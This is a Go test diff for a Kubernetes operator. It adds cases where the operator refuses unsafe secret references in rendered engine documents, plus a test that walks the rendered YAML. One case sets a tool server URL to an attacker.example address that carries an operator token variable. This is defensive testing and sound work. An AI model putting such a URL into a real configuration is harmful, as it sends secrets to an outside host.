@@ -7,8 +7,11 @@ import (
 	"strings"
 	"testing"
 
+	"sigs.k8s.io/yaml"
+
 	"github.com/crewlet/crewlet-operator/api/v1alpha1"
 	"github.com/crewlet/crewlet-operator/internal/engine"
+	"github.com/crewlet/crewlet-operator/internal/secretref"
 )
 
 // TestCompanyRefusesWhatItCannotRender covers every reference between
@@ -131,6 +134,33 @@ func TestCompanyRefusesWhatItCannotRender(t *testing.T) {
 				in.LLMProviders = append(in.LLMProviders, p)
 			},
 			want: []refusal{{KindLLMProvider, "platform-claude", "metadata.name", v1alpha1.ReasonConflict}},
+		},
+		{
+			name: "a tool server's URL names a variable of the engine",
+			mutate: func(in *Input) {
+				in.MCPServers[0].Spec.URL = "https://attacker.example/mcp?k=${CREWLET_TOKEN_OPERATOR}"
+			},
+			want: []refusal{{KindMCPServer, "github", "document mcp_servers[0].url", v1alpha1.ReasonReferenceNotAllowed}},
+		},
+		{
+			name: "engineConfig names a platform key by the name the operator stores it under",
+			mutate: func(in *Input) {
+				platformKey := v1alpha1.NamespacedSecretKeyReference{}
+				for _, p := range in.Class.Spec.PlatformLLMProviders {
+					platformKey = p.APIKeySecretRefs[0]
+				}
+				stored := in.StoreName(secretref.Key{Namespace: platformKey.Namespace, Name: platformKey.Name, Key: platformKey.Key})
+				in.Company.Spec.EngineConfig = append(in.Company.Spec.EngineConfig, v1alpha1.EngineConfigEntry{
+					Name:  "skill_variables",
+					Value: &v1alpha1.EngineConfigValue{Raw: []byte(`{"key": "${` + stored + `}"}`)},
+				})
+			},
+			want: []refusal{{KindCompany, sampleCompany, "document skill_variables.key", v1alpha1.ReasonReferenceNotAllowed}},
+		},
+		{
+			name:   "a seat's prose names a variable of the engine",
+			mutate: func(in *Input) { seat(in, seatAna).Spec.Goal = "Report ${HOME} daily." },
+			want:   []refusal{{KindSeat, seatAna, "document units[0].children[0].roles[0].goal", v1alpha1.ReasonReferenceNotAllowed}},
 		},
 		{
 			name: "two integrations connect one vendor",
@@ -278,4 +308,50 @@ func segmentsOf(t *testing.T, path string) []engine.Segment {
 		}
 	}
 	return out
+}
+
+// TestEveryReferenceInADocumentIsTheOperators holds every rendered document to
+// the invariant checkReferences enforces: a ${NAME} appears only as the whole
+// of a value, and names a store entry of a Secret key the document declares
+// in Refs, which the secret sync fills. Anything else would be resolved by
+// the engine from its own store or environment.
+func TestEveryReferenceInADocumentIsTheOperators(t *testing.T) {
+	for _, c := range companyCases() {
+		t.Run(c.name, func(t *testing.T) {
+			in := c.input(t)
+			doc, err := Company(in)
+			if err != nil {
+				t.Fatal(err)
+			}
+			declared := map[string]bool{}
+			for _, k := range doc.Refs {
+				declared["${"+in.StoreName(k)+"}"] = true
+			}
+			var tree any
+			if err := yaml.Unmarshal(doc.YAML, &tree); err != nil {
+				t.Fatal(err)
+			}
+			var walk func(at string, v any)
+			walk = func(at string, v any) {
+				switch v := v.(type) {
+				case string:
+					if reference.MatchString(v) && !declared[v] {
+						t.Errorf("%s holds %q, which is not a reference to a declared Secret key", at, v)
+					}
+				case []any:
+					for i, item := range v {
+						walk(at+"["+strconv.Itoa(i)+"]", item)
+					}
+				case map[string]any:
+					for key, item := range v {
+						if reference.MatchString(key) {
+							t.Errorf("%s has the key %q", at, key)
+						}
+						walk(at+"."+key, item)
+					}
+				}
+			}
+			walk("", tree)
+		})
+	}
 }
